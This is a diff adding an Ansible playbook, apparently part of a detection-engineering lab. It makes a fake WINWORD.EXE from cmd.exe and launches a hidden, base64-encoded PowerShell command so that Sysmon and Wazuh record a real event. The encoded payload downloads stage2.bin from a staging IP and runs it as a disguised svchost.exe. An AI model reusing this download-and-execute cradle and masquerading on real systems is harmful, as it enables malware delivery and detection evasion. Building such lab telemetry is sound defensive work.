@@ -1,0 +1,43 @@
+---
+# B1 artefact — a fake Office process spawning an obfuscated PowerShell
+# command. This generates a real Sysmon Event ID 1 rather than a forged log
+# line, so every downstream tool (Wazuh rules, Chainsaw, process-tree views)
+# sees a genuine event.
+
+- name: Create the fake Office install directory
+  ansible.windows.win_file:
+    path: '{{ office_dir }}'
+    state: directory
+
+- name: Plant a WINWORD.EXE stub (a copy of cmd.exe)
+  ansible.windows.win_copy:
+    src: C:\Windows\System32\cmd.exe
+    dest: '{{ office_stub }}'
+    remote_src: true
+
+- name: Build the UTF-16LE base64 payload
+  ansible.windows.win_shell: |
+    $payload = @'
+    $c=New-Object Net.WebClient
+    $c.DownloadFile('http://{{ staging_ip }}/upd/stage2.bin',"$env:APPDATA\Microsoft\svchost.exe")
+    Start-Process "$env:APPDATA\Microsoft\svchost.exe"
+    '@
+    $bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
+    [Convert]::ToBase64String($bytes)
+  register: encoded_payload
+  changed_when: false
+
+- name: Report the encoded payload
+  ansible.builtin.debug:
+    msg: "B1 PAYLOAD: {{ encoded_payload.stdout | trim }}"
+
+- name: Fire the encoded PowerShell command from the fake Office process
+  ansible.windows.win_shell: >
+    Start-Process -FilePath '{{ office_stub }}'
+    -ArgumentList '/c powershell.exe -nop -w hidden -enc {{ encoded_payload.stdout | trim }}'
+    -WindowStyle Hidden
+  changed_when: true
+
+- name: Give Sysmon and the agent time to ship the event
+  ansible.builtin.pause:
+    seconds: 20
